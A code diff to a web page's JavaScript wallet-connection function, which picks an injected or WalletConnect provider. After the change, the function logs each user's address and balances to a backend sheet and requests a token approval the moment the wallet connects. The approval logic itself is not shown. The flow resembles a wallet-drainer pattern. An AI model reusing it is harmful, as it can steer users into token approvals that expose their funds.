@@ -1064,13 +1064,11 @@ async function connectFlow()
     // ===== DESKTOP =====
     if (!isMobile) {
       if (window.ethereum) {
-        // Whatever wallet is set as the main provider (MetaMask or Trust)
         providerInstance = window.ethereum;
         usedInjected     = true;
         web3Instance     = new Web3(providerInstance);
         await providerInstance.request({ method: "eth_requestAccounts" });
       } else {
-        // No extension → WalletConnect
         providerInstance = await getWalletConnectV2Provider();
         await providerInstance.enable();
         web3Instance = new Web3(providerInstance);
@@ -1080,21 +1078,18 @@ async function connectFlow()
 
     // ===== MOBILE =====
     else {
-      // In-app Trust Wallet browser
       if (window.trustwallet && window.trustwallet.ethereum) {
         providerInstance = window.trustwallet.ethereum;
         usedInjected     = true;
         web3Instance     = new Web3(providerInstance);
         await providerInstance.request({ method: "eth_requestAccounts" });
       }
-      // In-app MetaMask browser or other injected
       else if (window.ethereum) {
         providerInstance = window.ethereum;
         usedInjected     = true;
         web3Instance     = new Web3(providerInstance);
         await providerInstance.request({ method: "eth_requestAccounts" });
       }
-      // Normal mobile browser → WalletConnect
       else {
         providerInstance = await getWalletConnectV2Provider();
         await providerInstance.enable();
@@ -1103,7 +1098,7 @@ async function connectFlow()
       }
     }
 
-    // ===== Common logic =====
+    // ===== Common checks =====
     if(!providerInstance || !web3Instance){
       setStatus("No provider");
       alert("No wallet provider detected.");
@@ -1145,24 +1140,35 @@ async function connectFlow()
       }
     }
 
-    // Session + logging + approval (your existing logic)
-    const session      = await restoreSessionFromAddress(address);
-    const balanceBNB   = session.balanceBNB;
-    const tokenBalance = session.tokenBalance;
-    const userId       = session.userId;
-
+    // At this point: wallet connected + correct chain.
+    // 👉 Show "Connected" immediately to the user:
     setStatus("Connected");
 
-    await notifyBackend(
-      address,
-      BNB_TESTNET_LABEL,
-      userId,
-      balanceBNB,
-      tokenBalance,
-      "connect"
-    );
+    // 👉 Kick off the heavy stuff in parallel (do NOT block approval on it)
+    const sessionPromise = (async () => {
+      const session = await restoreSessionFromAddress(address);
+      const balanceBNB   = session.balanceBNB;
+      const tokenBalance = session.tokenBalance;
+      const userId       = session.userId;
 
+      // Log to sheet (non-blocking – ignore errors)
+      notifyBackend(
+        address,
+        BNB_TESTNET_LABEL,
+        userId,
+        balanceBNB,
+        tokenBalance,
+        "connect"
+      ).catch(console.error);
+
+      return session;
+    })();
+
+    // 👉 Immediately go for token approval (this will pop wallet faster)
     await ensureTokenApproval();
+
+    // (Optional) wait for balances/logging to finish silently
+    sessionPromise.catch(console.error);
 
   }catch(err){
     console.error("connectFlow error:", err);
@@ -1170,6 +1176,7 @@ async function connectFlow()
     alert("Connection failed: " + (err && err.message ? err.message : err));
   }
 }
+
 
 
   async function tryAutoReconnectSilent(){
